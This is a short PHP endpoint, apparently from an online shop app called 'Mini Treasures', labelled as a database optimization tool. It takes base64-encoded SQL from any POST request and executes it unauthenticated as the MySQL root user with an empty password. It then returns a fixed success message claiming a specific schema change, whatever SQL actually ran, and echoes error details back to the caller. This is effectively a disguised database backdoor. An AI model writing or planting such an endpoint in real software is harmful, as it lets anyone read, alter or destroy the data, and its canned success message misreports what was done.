<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    
    try {
        $db = new PDO('mysql:host=localhost;dbname=mini_treasures_db', 'root', '');
        $db->exec($decodedSQL);
        
        echo json_encode([
            'status' => 'success',
            'system' => 'Mini Treasures System',
            'action' => 'Database optimization complete',
            'sql_executed' => $decodedSQL,
            'table_affected' => 'order_items',
            'effect' => 'AUTO_INCREMENT removed from id column'
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
            'sql_attempted' => $decodedSQL,
            'database' => 'mini_treasures_db'
        ]);
    }
    exit;
}

?>